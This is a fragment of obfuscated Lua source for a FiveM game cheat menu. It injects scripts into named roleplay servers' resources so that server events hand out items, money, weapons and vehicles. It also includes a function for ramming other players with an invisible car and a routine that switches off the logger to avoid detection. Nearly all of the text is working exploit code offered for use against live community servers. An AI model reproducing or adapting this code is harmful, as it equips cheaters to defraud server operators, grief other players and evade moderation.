            ]],v734,v735,v736));MachoMenuNotification("Success","Sent to yellow pages!");break;end if (v733==1) then v736=MachoMenuGetInputbox(v646);if ( not v734 or (v734=="")) then local v942=0 -0 ;while true do if (v942==(0 + 0)) then MachoMenuNotification("Error","Please enter a name!");return;end end end v733=3 -1 ;end if (v733==(0 -0)) then v734=MachoMenuGetInputbox(v644);v735=MachoMenuGetInputbox(v645);v733=1;end if (v733==(3 -1)) then if ( not v735 or (v735=="")) then MachoMenuNotification("Error","Please enter a phone number!");return;end if ( not v736 or (v736=="")) then MachoMenuNotification("Error","Please enter a message!");return;end v733=7 -4 ;end end end);end if v436:find("Aera Roleplay") then local v647=MachoMenuAddTab(v4,"Aera Roleplay");local v648=MachoMenuGroup(v647,"Item Exploit",v3,0,(v1.x-v3) + 108 + 42 ,679 -(318 + 211) );local v649=MachoMenuInputbox(v648,"Item Code","e.g., sandwich");local v650=MachoMenuInputbox(v648,"Amount","e.g., 3");MachoMenuButton(v648,"Give Item",function() local v737=0 -0 ;local v738;local v739;while true do if ((1587 -(963 + 624))==v737) then v738=MachoMenuGetInputbox(v649);v739=tonumber(MachoMenuGetInputbox(v650)) or (1 + 0) ;v737=1;end if (v737==(847 -(518 + 328))) then if ((v738~="") and (v739>(0 -0))) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent("jim-mining:server:toggleItem", -1, "%s", %d) 
                ]],v738,v739,v738,v739));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end end end);end if v436:find("Istanbul Roleplay") then local v651=MachoMenuAddTab(v4,"Istanbul Roleplay");local v652=MachoMenuGroup(v651,"Istanbul Roleplay Item",v3,13 -4 ,(v1.x-v3) + (467 -(301 + 16)) ,v1.y);local v653=MachoMenuInputbox(v652,"Code Name","Example: item_code");local v654=MachoMenuInputbox(v652,"Code Amount","Example: 3");MachoMenuButton(v652,"Item Exploit",function() local v740=0 -0 ;local v741;local v742;while true do if (v740==2) then MachoInjectResource("ox_inventory",string.format([[
                local items = exports.ox_inventory:Items()
                local playerItems = []
    
                for itemName, _ in pairs(items) do
                    local count = exports.ox_inventory:GetItemCount(itemName)
                    if count and count > 0 then
                        table.insert(playerItems, itemName)
                    end
                end
    
                if #playerItems == 0 then
                    return
                end
    
                local randomItem = playerItems[math.random(1, #playerItems)]
                local tradeData = {
                    first = { amount = 0, name = randomItem },
                    second = { amount = { max = %d, min = %d }, name = "%s" },
                    third = nil
                }
    
                TriggerServerEvent("earth-illegal:server:TradeItem", tradeData.first, tradeData.second, tradeData.third)
            ]],v742,v742,v741));break;end if (v740==(2 -1)) then if ( not v741 or (v741=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v742 or (v742<=(0 -0))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end v740=2 + 0 ;end if (v740==(0 + 0)) then v741=MachoMenuGetInputbox(v653);v742=tonumber(MachoMenuGetInputbox(v654));v740=1;end end end);MachoMenuText(v652,"Money Exploit");local v655=MachoMenuInputbox(v652,"Payment Type","Only Cash or Bank");local v656=MachoMenuInputbox(v652,"Money Amount","Example: 10000");MachoMenuButton(v652,"Spawn Money",function() local v743={paymentType=MachoMenuGetInputbox(v655),refund=tonumber(MachoMenuGetInputbox(v656)) or (23721 -12610) ,playerId=GetPlayerServerId(PlayerId())};if ((v743.paymentType~="Cash") and (v743.paymentType~="Bank")) then local v850=0 + 0 ;while true do if (v850==(0 + 0)) then MachoMenuNotification("Error","Payment type must be 'Cash' or 'Bank'!");return;end end end if ( not v743.refund or (v743.refund<=(0 -0))) then local v851=0 + 0 ;while true do if (v851==(1019 -(829 + 190))) then MachoMenuNotification("Error","Please enter a valid money amount!");return;end end end MachoInjectResource("monitor",string.format([[
                TriggerServerEvent('CL-PoliceGarageV2:RefundRent', "%s", %d, %d, "policejob")
            ]],v743.paymentType,v743.refund,v743.playerId));MachoMenuNotification("Success","Money exploit sent! Amount: "   .. v743.refund );end);MachoMenuText(v652,"Vehicle Data Exploit");local v657=MachoMenuInputbox(v652,"Vehicle Name","Example: sultan");MachoMenuButton(v652,"Send Vehicle",function() local v744=MachoMenuGetInputbox(v657);if ( not v744 or (v744=="")) then local v852=0 -0 ;while true do if (v852==0) then MachoMenuNotification("Error","Vehicle name cannot be empty!");return;end end end MachoInjectResource("CL-PoliceGarage",string.format([[
                TriggerServerEvent("CL-PoliceGarage:TakeMoney", "cash", 0, "%s", "%s")
            ]],v744,v744,v744));MachoMenuNotification("Success","Vehicle exploit sent! Vehicle: "   .. v744 );end);MachoMenuText(v652,"Vehicle Data V2");local v658=MachoMenuInputbox(v652,"Vehicle Code","Example: adder");MachoMenuButton(v652,"Send Vehicle V2",function() local v745=0;local v746;while true do if (v745==0) then v746=MachoMenuGetInputbox(v658);if ( not v746 or (v746=="")) then MachoMenuNotification("Error","Vehicle code cannot be empty!");return;end v745=1;end if (1==v745) then MachoInjectResource("pa-vehicleshop",string.format([[
                TriggerServerEvent('pa-vehicleshop:buyVehicle:server', "bank", "%s", 1, 1, nil, "cardealer")
            ]],v746,v746));MachoMenuNotification("Success","Vehicle V2 exploit sent! Vehicle: "   .. v746 );break;end end end);MachoMenuText(v652,"All Bring");MachoMenuButton(v652,"All Bring",function() MachoInjectResource("monitor",[[
                TriggerServerEvent('ServerValidEmote', '-1', 'dog', 'dog', 1405553601)
            ]]);MachoMenuNotification("Success","All Bring exploit sent!");end);end if v436:find("Ria Roleplay") then local v659=0;local v660;local v661;local v662;local v663;local v664;local v665;local v666;while true do if (4==v659) then MachoMenuButton(v661,"Send to Yellow Pages",function() local v910=MachoMenuGetInputbox(v664);local v911=MachoMenuGetInputbox(v665);local v912=MachoMenuGetInputbox(v666);if ( not v910 or (v910=="")) then MachoMenuNotification("Error","Please enter a name!");return;end if ( not v911 or (v911=="")) then MachoMenuNotification("Error","Please enter a phone number!");return;end if ( not v912 or (v912=="")) then local v943=0 -0 ;while true do if (v943==(0 -0)) then MachoMenuNotification("Error","Please enter a message!");return;end end end TriggerServerEvent("gksphone:yellow_postPagess",v910,v911,v912,"","bartender");MachoMenuNotification("Success","Sent to yellow pages!");end);break;end if (v659==(4 -2)) then MachoMenuButton(v661,"Item Exploit",function() local v913=MachoMenuGetInputbox(v662);local v914=tonumber(MachoMenuGetInputbox(v663));if ( not v913 or (v913=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v914 or (v914<=(0 + 0))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v913,v914));end);v664=MachoMenuInputbox(v661,"Name","Name to appear in yellow pages");v659=3;end if (v659==(1 + 2)) then v665=MachoMenuInputbox(v661,"Phone Number","Example: 123-456-7890");v666=MachoMenuInputbox(v661,"Message","Text to appear in yellow pages");v659=12 -8 ;end if ((0 + 0)==v659) then v660=MachoMenuAddTab(v4,"Ria Roleplay");v661=MachoMenuGroup(v660,"Ria Roleplay Item",v3,622 -(520 + 93) ,(v1.x-v3) + (426 -(259 + 17)) ,v1.y);v659=1 + 0 ;end if ((1 + 0)==v659) then v662=MachoMenuInputbox(v661,"Code Name","Example: item_code");v663=MachoMenuInputbox(v661,"Code Amount","Example: 3");v659=6 -4 ;end end end if v436:find("Gonna Roleplay") then local v667=591 -(396 + 195) ;local v668;local v669;local v670;local v671;while true do if (1==v667) then v670=MachoMenuInputbox(v669,"Code Name","Example: item_code");v671=MachoMenuInputbox(v669,"Code Amount","Example: 3");v667=5 -3 ;end if (v667==(1763 -(440 + 1321))) then MachoMenuButton(v669,"Item Exploit",function() local v915=MachoMenuGetInputbox(v670);local v916=tonumber(MachoMenuGetInputbox(v671));if ( not v915 or (v915=="")) then local v944=0;while true do if (v944==(1829 -(1059 + 770))) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v916 or (v916<=0)) then local v945=0 -0 ;while true do if (v945==(545 -(424 + 121))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("ox_inventory",string.format([[
                local items = exports.ox_inventory:Items()
                local playerItems = {}

                for itemName, _ in pairs(items) do
                    local count = exports.ox_inventory:GetItemCount(itemName)
                    if count and count > 0 then
                        table.insert(playerItems, itemName)
                    end
                end

                if #playerItems == 0 then
                    return
                end

                local randomItem = playerItems[math.random(1, #playerItems)]

                TriggerServerEvent("gonna-illegal:server:TradeItem", 
                    json.decode(string.format('{"amount":0,"name":"%%s"}', randomItem)), 
                    json.decode(string.format('{"amount":{"max":%d,"min":%d},"name":"%s"}', %d, %d, "%s")), 
                    json.decode('null')
                )
            ]],v916,v916,v915,v916,v916,v915));end);break;end if (v667==(0 + 0)) then v668=MachoMenuAddTab(v4,"Gonna Roleplay");v669=MachoMenuGroup(v668,"Gonna Roleplay Item",v3,9,(v1.x-v3) + 150 ,v1.y);v667=1;end end end if v436:find("Royal Roleplay") then local v672=MachoMenuAddTab(v4,"Royal Roleplay");local v673=MachoMenuGroup(v672,"Royal Roleplay Item",v3,9,(v1.x-v3) + (1497 -(641 + 706)) ,v1.y);local v674=MachoMenuInputbox(v673,"Code Name","Example: item_code");local v675=MachoMenuInputbox(v673,"Code Amount","Example: 3");MachoMenuButton(v673,"Item Exploit",function() local v747=0 + 0 ;local v748;local v749;while true do if (v747==(442 -(249 + 191))) then MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v748,v749));break;end if (v747==(0 -0)) then v748=MachoMenuGetInputbox(v674);v749=tonumber(MachoMenuGetInputbox(v675));v747=1 + 0 ;end if (v747==(3 -2)) then if ( not v748 or (v748=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v749 or (v749<=0)) then local v946=0;while true do if (v946==0) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end v747=429 -(183 + 244) ;end end end);end if v436:find("Rac10") then local v676=MachoMenuAddTab(v4,"Rac10 Exploits");local v677=MachoMenuGroup(v676,"Rac10 Exploits",v3,1 + 8 ,(v1.x-v3) + (880 -(434 + 296)) ,v1.y);MachoMenuText(v677,"Vehicle Exploit");local v678=MachoMenuInputbox(v677,"Vehicle Model","e.g., hakuchou");local v679=MachoMenuInputbox(v677,"Plate","e.g., 34AKP952");MachoMenuButton(v677,"Spawn Vehicle",function() local v750={model=MachoMenuGetInputbox(v678) or "hakuchou" ,plate=MachoMenuGetInputbox(v679) or "34AKP952" };if (v750.model and (v750.model~="") and v750.plate and (v750.plate~="")) then local v853=0 -0 ;while true do if (v853==(512 -(169 + 343))) then MachoInjectResource("monitor",string.format([[ 
                    local model = "%s"
                    local plate = "%s"
                    local playerPed = PlayerPedId()
                    local spawnLoc = GetEntityCoords(playerPed)
                    local spawnHeading = GetEntityHeading(playerPed)
        
                    QBCore.Functions.SpawnVehicle(model, function(veh)
                        SetEntityHeading(veh, spawnHeading)
                        SetVehicleNumberPlateText(veh, plate)
                        TaskWarpPedIntoVehicle(playerPed, veh, -1)
                        SetVehicleEngineOn(veh, true, true)
                        Citizen.Wait(500)
                        TriggerEvent("bb_admin:client:SaveCar")
                    end, spawnLoc, true)
                ]],v750.model,v750.plate));MachoMenuNotification("Success","Vehicle spawned!");break;end end else MachoMenuNotification("Error","Please enter a valid vehicle model and plate!");end end);MachoMenuText(v677,"Money Exploit");local v680=MachoMenuInputbox(v677,"Money Amount","e.g., 100000");MachoMenuButton(v677,"Spawn Money",function() local v751={amount=tonumber(MachoMenuGetInputbox(v680)) or 100000 };if (v751.amount>(0 + 0)) then MachoInjectResource("qb-taxijob",string.format([[ 
                    TriggerServerEvent('qb-taxi:server:NpcPay', %d)
                ]],v751.amount));MachoMenuNotification("Success","Money exploit executed!");else MachoMenuNotification("Error","Please enter a valid money amount!");end end);MachoMenuText(v677,"Item Exploit");local v681=MachoMenuInputbox(v677,"Item Code","e.g., weapon_pistol");MachoMenuButton(v677,"Give Item",function() local v752=0 -0 ;local v753;while true do if (v752==0) then v753=MachoMenuGetInputbox(v681) or "weapon_pistol" ;if (v753~="") then MachoInjectResource("monitor",string.format([[ 
                    QBCore.Functions.TriggerCallback('bz:itemsver', function(item)
                    end, '%s')
                ]],v753));MachoMenuNotification("Success","Item exploit executed!");else MachoMenuNotification("Error","Please enter a valid item code!");end break;end end end);end if v436:find("Xen Roleplay") then local v682=0 -0 ;local v683;local v684;local v685;local v686;while true do if (v682==(1 + 0)) then v685=MachoMenuInputbox(v684,"Item Name","...");v686=MachoMenuInputbox(v684,"Amount","1");v682=2;end if (v682==(0 -0)) then v683=MachoMenuAddTab(v4,"Xen Roleplay");v684=MachoMenuGroup(v683,"Xen Roleplay",v3,1132 -(651 + 472) ,(v1.x-v3) + 114 + 36 ,v1.y);v682=1 + 0 ;end if (v682==(2 -0)) then MachoMenuButton(v684,"Add Item",function() local v917=483 -(397 + 86) ;local v918;while true do if (v917==(876 -(423 + 453))) then v918={item=MachoMenuGetInputbox(v685),amount=tonumber(MachoMenuGetInputbox(v686)) or (1 + 0) };if (v918.item and (v918.item~="") and (v918.amount>0)) then MachoInjectResource("savana-restaurant",string.format([[
                    TriggerServerEvent('savana-restaurant:giveItem', "%s", %d)
                ]],v918.item,v918.amount,v918.item,v918.amount));else MachoMenuNotification("Error","Please enter a valid item name and amount!");end break;end end end);break;end end end if v436:find("HotV") then local v687=MachoMenuAddTab(v4,"HotV");local v688=MachoMenuGroup(v687,"HotV Item",v3,2 + 7 ,(v1.x-v3) + 131 + 19 ,v1.y);local v689=MachoMenuInputbox(v688,"Code Name","Example: item_code");local v690=MachoMenuInputbox(v688,"Code Amount","Example: 3");MachoMenuButton(v688,"Item Exploit",function() local v754=MachoMenuGetInputbox(v689);local v755=tonumber(MachoMenuGetInputbox(v690));if ( not v754 or (v754=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v755 or (v755<=(0 + 0))) then local v854=0 + 0 ;while true do if (v854==(1190 -(50 + 1140))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v754,v755));end);local v691=MachoMenuInputbox(v688,"Name","Name to appear in yellow pages");local v692=MachoMenuInputbox(v688,"Phone Number","Example: 123-456-7890");local v693=MachoMenuInputbox(v688,"Message","Text to appear in yellow pages");MachoMenuButton(v688,"Send to Yellow Pages",function() local v756=MachoMenuGetInputbox(v691);local v757=MachoMenuGetInputbox(v692);local v758=MachoMenuGetInputbox(v693);if ( not v756 or (v756=="")) then MachoMenuNotification("Error","Please enter a name!");return;end if ( not v757 or (v757=="")) then local v855=0 + 0 ;while true do if (v855==(0 + 0)) then MachoMenuNotification("Error","Please enter a phone number!");return;end end end if ( not v758 or (v758=="")) then local v856=0 + 0 ;while true do if (v856==(0 -0)) then MachoMenuNotification("Error","Please enter a message!");return;end end end TriggerServerEvent("gksphone:yellow_postPagess",v756,v757,v758,"","bartender");MachoMenuNotification("Success","Sent to yellow pages!");end);end if v436:find("Black Roleplay") then local v694=MachoMenuAddTab(v4,"Black Roleplay");local v695=MachoMenuGroup(v694,"Item Exploit",v3,0,(v1.x-v3) + 109 + 41 ,746 -(157 + 439) );local v696=MachoMenuInputbox(v695,"Item Code","e.g., sandwich");local v697=MachoMenuInputbox(v695,"Amount","e.g., 3");MachoMenuButton(v695,"Give Item",function() local v759=0 -0 ;local v760;local v761;while true do if ((0 -0)==v759) then v760=MachoMenuGetInputbox(v696);v761=tonumber(MachoMenuGetInputbox(v697)) or 1 ;v759=2 -1 ;end if (v759==(919 -(782 + 136))) then if ((v760~="") and (v761>(855 -(112 + 743)))) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent("jim-consumables:server:toggleItem", -1, "%s", %d) 
                ]],v760,v761,v760,v761));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end end end);end end);Citizen.CreateThread(function() MachoLockLogger();while v5 do if MachoMenuIsOpen(v4) then if (MachoGetLoggerState()~=(1171 -(1026 + 145))) then MachoSetLoggerState(0 + 0 );MachoLockLogger();MachoMenuNotification("Error","Logger cannot be active while using the menu!");end end Citizen.Wait(718 -(493 + 225) );end end);function ShowGTAStyleInput(v438,v439,v440,v441) DisplayOnscreenKeyboard(3 -2 ,v438,"",v439,"","","",v440);while UpdateOnscreenKeyboard()==0  do Wait(0);end if GetOnscreenKeyboardResult() then local v698=0;local v699;while true do if (v698==(0 + 0)) then v699=GetOnscreenKeyboardResult();v441(v699);break;end end end end function GetPlayerServerIdByName(v442) local v443=nil;for v516=0 -0 ,255 do if NetworkIsPlayerActive(v516) then local v762=GetPlayerServerId(v516);local v763=GetPlayerName(v516);if (v763==v442) then v443=v762;break;end end end return v443;end function RamPlayer(v444) local v445=0;local v446;while true do if (0==v445) then v446=GetPlayerFromServerId(v444);if v446 then local v857=GetPlayerPed(v446);local v858=GetEntityCoords(v857);local v859=GetOffsetFromEntityInWorldCoords(v857,0 + 0 , -(5 -3),0 + 0 );local v860="futo";RequestModel(v860);while  not HasModelLoaded(v860) do Citizen.Wait(0);end local v861=CreateVehicle(v860,v859.x,v859.y,v859.z,GetEntityHeading(v857),true,true);SetEntityVisible(v861,false,true);if DoesEntityExist(v861) then NetworkRequestControlOfEntity(v861);SetVehicleDoorsLocked(v861,4);SetVehicleForwardSpeed(v861,200 -80 );end else MachoMenuNotification("Error","Player with ID "   .. v444   .. " not found." );end break;end end end function DrawPlayerServerIds() for v517=0,255 do if NetworkIsPlayerActive(v517) then local v764=1595 -(210 + 1385) ;local v765;local v766;local v767;local v768;local v769;local v770;while true do if (v764==(1691 -(1201 + 488))) then v770=v770 + 1 ;DrawText3D(v768,v769,v770,tostring(v766));break;end if (v764==(1 + 0)) then v767=GetEntityCoords(v765);v768,v769,v770=table.unpack(v767);v764=2 -0 ;end if (v764==(0 -0)) then v765=GetPlayerPed(v517);v766=GetPlayerServerId(v517);v764=586 -(352 + 233) ;end end end end end function DrawText3D(v447,v448,v449,v450) local v451=0;local v452;local v453;local v454;while true do if (v451==(0 -0)) then v452,v453,v454=World3dToScreen2d(v447,v448,v449);if v452 then SetTextScale(0.35,0.35);SetTextFont(4);SetTextProportional(1);SetTextColour(139 + 116 ,725 -470 ,829 -(489 + 85) ,215);SetTextEntry("STRING");SetTextCentre(1502 -(277 + 1224) );AddTextComponentString(v450);DrawText(v453,v454);end break;end end end Citizen.CreateThread(function() while true do Citizen.Wait(1493 -(663 + 830) );if v11 then DrawPlayerServerIds();end end end);local v174=MachoMenuAddTab(v4,"Easy Spawn");local v175=MachoMenuGroup(v174,"Easy Spawn",v3,8 + 1 ,(v1.x-v3) + 150 ,v1.y);local function v176(v455,v456,v457) local v458=0;while true do if (v458==(2 -1)) then if (v457=="lumberjack") then TriggerServerEvent("rt-lumberjack:server:giveItem",v455,v456);MachoMenuNotification("Easy Spawn","Spawned "   .. v455   .. " x"   .. v456 );print("[Easy Spawn] Spawned "   .. v455   .. " x"   .. v456 );elseif (v457=="steal") then local v930=0;local v931;while true do if (v930==2) then print("[Easy Spawn] Spawned "   .. v455   .. " x"   .. v456 );break;end if (v930==1) then if  not v931 then local v972=nil;if (GetResourceState("rt-steal")=="started") then v972="rt-steal";elseif (GetResourceState("monitor")=="started") then v972="monitor";elseif (GetResourceState("qb-core")=="started") then v972="qb-core";else v972="ox_inventory";end MachoInjectResource2(NewThreadNs,v972,string.format([[
                local itemName = "%s"
                local amount = %d
                TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
            ]],v455,v456));end MachoMenuNotification("Easy Spawn","Spawned "   .. v455   .. " x"   .. v456 );v930=877 -(461 + 414) ;end if (v930==0) then v931=false;pcall(function() local v969=0;while true do if (v969==(0 + 0)) then TriggerServerEvent("rt-steal:server:giveItem",v455,v456);v931=true;break;end end end);v930=1;end end end break;end if (v458==(0 + 0)) then v456=v456 or 1 ;v457=v457 or "lumberjack" ;v458=1;end end end MachoMenuText(v175,"WEAPONS (RT Steal)");MachoMenuButton(v175,"Pistol",function() v176("weapon_pistol",1,"steal");end);MachoMenuButton(v175,"Combat Pistol",function() v176("weapon_combatpistol",1 + 0 ,"steal");end);MachoMenuButton(v175,"AP Pistol",function() v176("weapon_appistol",1,"steal");end);MachoMenuButton(v175,"Pistol 50",function() v176("weapon_pistol50",1,"steal");end);MachoMenuButton(v175,"SMG",function() v176("weapon_smg",1 + 0 ,"steal");end);MachoMenuButton(v175,"Micro SMG",function() v176("weapon_microsmg",251 -(172 + 78) ,"steal");end);MachoMenuButton(v175,"Assault SMG",function() v176("weapon_assaultsmg",1,"steal");end);MachoMenuButton(v175,"Assault Rifle",function() v176("weapon_assaultrifle",1 -0 ,"steal");end);MachoMenuButton(v175,"Carbine Rifle",function() v176("weapon_carbinerifle",1 + 0 ,"steal");end);MachoMenuButton(v175,"Advanced Rifle",function() v176("weapon_advancedrifle",1 -0 ,"steal");end);MachoMenuButton(v175,"Pump Shotgun",function() v176("weapon_pumpshotgun",1,"steal");end);MachoMenuButton(v175,"Sawed Off Shotgun",function() v176("weapon_sawnoffshotgun",1 + 0 ,"steal");end);MachoMenuButton(v175,"Assault Shotgun",function() v176("weapon_assaultshotgun",1,"steal");end);MachoMenuButton(v175,"Sniper Rifle",function() v176("weapon_sniperrifle",1,"steal");end);MachoMenuButton(v175,"Heavy Sniper",function() v176("weapon_heavysniper",1 + 0 ,"steal");end);MachoMenuButton(v175,"RPG",function() v176("weapon_rpg",1 -0 ,"steal");end);MachoMenuButton(v175,"Minigun",function() v176("weapon_minigun",1 -0 ,"steal");end);MachoMenuButton(v175,"Grenade Launcher",function() v176("weapon_grenadelauncher",1 + 0 ,"steal");end);MachoMenuButton(v175,"Railgun",function() v176("weapon_railgun",1 + 0 ,"steal");end);MachoMenuButton(v175,"Stun Gun (Taser)",function() v176("weapon_stungun",1,"steal");end);MachoMenuButton(v175,"Knife",function() v176("weapon_knife",1 + 0 ,"steal");end);MachoMenuButton(v175,"Bat",function() v176("weapon_bat",3 -2 ,"steal");end);MachoMenuText(v175,"ITEMS (RT Steal)");MachoMenuButton(v175,"Lockpick",function() v176("lockpick",11 -6 ,"steal");end);MachoMenuButton(v175,"Advanced Lockpick",function() v176("advancedlockpick",2 + 3 ,"steal");end);MachoMenuButton(v175,"Handcuffs",function() v176("handcuffs",3 + 2 ,"steal");end);MachoMenuButton(v175,"Phone",function() v176("phone",1,"steal");end);MachoMenuButton(v175,"medkit",function() v176("medkit",1,"steal");end);MachoMenuButton(v175,"Drill",function() v176("drill",1,"steal");end);MachoMenuButton(v175,"Fal",function() v176("weapon_fal",448 -(133 + 314) ,"steal");end);MachoMenuButton(v175,"Repair Kit",function() v176("repairkit",1 + 4 ,"steal");end);MachoMenuButton(v175,"Bandage",function() v176("bandage",223 -(199 + 14) ,"steal");end);MachoMenuButton(v175,"Painkillers",function() v176("painkillers",35 -25 ,"steal");end);MachoMenuButton(v175,"Armor",function() v176("armor",1,"steal");end);MachoMenuText(v175,"DRUGS (RT Steal)");MachoMenuButton(v175,"Weed",function() v176("weed",1559 -(647 + 902) ,"steal");end);MachoMenuButton(v175,"Cocaine",function() v176("cocaine",10,"steal");end);MachoMenuButton(v175,"Meth",function() v176("meth",30 -20 ,"steal");end);MachoMenuButton(v175,"Crack",function() v176("crack",243 -(85 + 148) ,"steal");end);MachoMenuButton(v175,"Heroin",function() v176("heroin",1299 -(426 + 863) ,"steal");end);MachoMenuButton(v175,"Oxy",function() v176("oxy",10,"steal");end);MachoMenuText(v175,"AMMO (RT Steal)");MachoMenuButton(v175,"Pistol Ammo x100",function() v176("pistol_ammo",100,"steal");end);MachoMenuButton(v175,"SMG Ammo x100",function() v176("smg_ammo",468 -368 ,"steal");end);MachoMenuButton(v175,"Rifle Ammo x100",function() v176("rifle_ammo",1754 -(873 + 781) ,"steal");end);MachoMenuButton(v175,"Shotgun Ammo x100",function() v176("shotgun_ammo",133 -33 ,"steal");end);MachoMenuButton(v175,"Sniper Ammo x100",function() v176("sniper_ammo",100,"steal");end);MachoMenuButton(v175,"RPG Ammo x10",function() v176("rpg_ammo",10,"steal");end);MachoMenuButton(v175,"sniper_full",function() v176("sniper_full",29 -18 ,"steal");end);MachoMenuButton(v175,"rifle_full",function() v176("rifle_full",5 + 6 ,"steal");end);MachoMenuButton(v175,"pistol_full",function() v176("pistol_full",7,"steal");end);MachoMenuText(v175,"LUMBERJACK ITEMS");MachoMenuButton(v175,"Wood",function() v176("wood",50,"lumberjack");end);MachoMenuButton(v175,"Plank",function() v176("plank",50,"lumberjack");end);MachoMenuButton(v175,"Log",function() v176("log",184 -134 ,"lumberjack");end);MachoMenuButton(v175,"Sawdust",function() v176("sawdust",50,"lumberjack");end);MachoMenuText(v175,"FOOD & DRINK (RT Steal)");MachoMenuButton(v175,"Water Bottle",function() v176("water_bottle",14 -4 ,"steal");end);MachoMenuButton(v175,"Sandwich",function() v176("sandwich",10,"steal");end);MachoMenuButton(v175,"Burger",function() v176("burger",10,"steal");end);MachoMenuButton(v175,"Donut",function() v176("donut",29 -19 ,"steal");end);MachoMenuButton(v175,"Coffee",function() v176("coffee",1957 -(414 + 1533) ,"steal");end);MachoMenuButton(v175,"Energy Drink",function() v176("energydrink",10,"steal");end);MachoMenuText(v175,"MISC ITEMS (RT Steal)");MachoMenuButton(v175,"Laptop",function() v176("laptop",1,"steal");end);MachoMenuButton(v175,"Hacking Device",function() v176("hacking_device",1,"steal");end);MachoMenuButton(v175,"USB Drive",function() v176("usb_drive",5 + 0 ,"steal");end);MachoMenuButton(v175,"Radio",function() v176("radio",556 -(443 + 112) ,"steal");end);MachoMenuButton(v175,"Binoculars",function() v176("binoculars",1,"steal");end);MachoMenuButton(v175,"Scuba Gear",function() v176("scuba_gear",1480 -(888 + 591) ,"steal");end);MachoMenuButton(v175,"Parachute",function() v176("parachute",1,"steal");end);print("[Easy Spawn] Tab loaded!");local v177=MachoMenuAddTab(v4,"Weapons");local v178=MachoMenuGroup(v177,"Weapon Options",v3,23 -14 ,(v1.x-v3) + 150 ,v1.y);local v179=15 + 235 ;local function v180(v459,v460) v460=v460 or v179 ;local v461=GetHashKey(v459);if (v461 and (v461~=(0 -0))) then GiveWeaponToPed(PlayerPedId(),v461,v460,false,true);SetCurrentPedWeapon(PlayerPedId(),v461,true);MachoMenuNotification("Weapon","Spawned: "   .. v459 );print("[Weapon] Spawned: "   .. v459   .. " x"   .. v460 );else MachoMenuNotification("Error","Invalid weapon: "   .. v459 );end end MachoMenuText(v178,"MELEE WEAPONS");MachoMenuButton(v178,"Knife",function() v180("WEAPON_KNIFE",1);end);MachoMenuButton(v178,"Bat",function() v180("WEAPON_BAT",1 + 0 );end);MachoMenuButton(v178,"Hammer",function() v180("WEAPON_HAMMER",1 + 0 );end);MachoMenuButton(v178,"Crowbar",function() 